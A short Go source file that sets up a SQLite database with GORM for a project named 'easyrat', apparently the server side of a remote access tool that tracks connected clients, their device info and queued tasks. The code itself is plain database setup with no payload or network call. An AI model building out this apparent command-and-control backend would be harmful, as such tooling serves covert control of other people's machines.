package utils

import (
	"easyrat/utils/types"

	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type Client struct {
	ID        string `gorm:"primary_key"`
	Connected bool
	types.DeviceInfoStruct
}

var DB *gorm.DB

func ConnectDB() {
	db, err := gorm.Open(sqlite.Open("server.db"), &gorm.Config{})
	if err != nil {
		panic("Failed to init db")
	}

	db.AutoMigrate(&Client{}, &types.Task{}, &types.Parameter{})

	DB = db
}
